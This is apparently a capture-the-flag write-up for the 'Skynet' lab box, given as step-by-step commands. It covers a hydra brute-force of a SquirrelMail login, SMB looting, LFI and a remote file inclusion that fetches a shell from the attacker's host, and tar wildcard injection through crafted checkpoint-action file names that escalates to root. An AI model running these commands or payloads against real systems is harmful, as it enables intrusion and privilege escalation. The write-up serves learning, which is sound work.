# CTF Writeup: Skynet

---

- Step 1: added target_ip to /etc/hosts & made nmap scan --> 22,80,110,139,143,445,8082,18040 open
- Step 2: ran gobuster scan found hidden dir /squirrelmail/src/login.php
- Step 3: since smb is open --> made smbmap -H target_ip --> and saw 1 readadble resource
- Step 4: made smbclient //target_ip/anonymous -N --> /anonymous is the readable resource
- Step 5: get'd 4 .txt files --> 1 file included a wordlist and 1 file gave me information
about user "miles"
- Step 6: ran hydra to brute-force password for login page 
--> made hydra -l milesdyson -P log1.txt skynet.thm http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user" -V -I
- Step 7: retrieved creds "milesdyson:cyborg007haloterminator" and logged in --> retrieved new
password from mail: )s{A&2Z=F^n_E.B`
- Step 8: logged into smbclient milesdyson --> made smbclient //skynet.thm/milesdyson -U milesdyson
and passed in password
- Step 9: made get important.txt --> retrieved secret endpoint --> nothing big on the endpoint itself
- Step 10: made dirsearch -u http://skynet.thm/45kra24zxs28v3yd/ and found hidden endpoint /administrator
- Step 11: login page. --> sql injections didnt work and any hydra brute forcing attempts didnt work
- Step 12: looked up cuppa cms cve's and found an interesting one --> endpoint /alerts/alertConfigField.php
is exploitable with LFI / RFI
- Step 13: added ?urlConfig=php://filter/convert.base64-encode/resource=/etc/passwd to my url --> LFI worked
- Step 14: started listener + created python server on my local machine on port 8000 and made http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.21.156.104:8000/shell.php
- Step 15: gained rce into server --> retrieved user.txt 
- Step 16: investigated backups dir within miles user --> inspected the backup.sh script --> is running with root rights on a cronjob
- Step 17: navigated into /var/www/html, since the script navigates there too and unpacks the compressed files
- Step 18: made touch "/var/www/html/--checkpoint-action=exec=sh root_shell.sh"
- Step 19: made echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/root_shell.sh
- Step 20: made touch "/var/www/html/--checkpoint=1"
- Step 21: gained root shell after some time --> retrieved root flag.
---

## Key Learnings

- First Contact with Remote File Inclusion
- Strengthened hydra brute-forcing knowledge
- Strengthened smbclient & smbmap syntax knowledge
- First Contact with Wildcard Injection
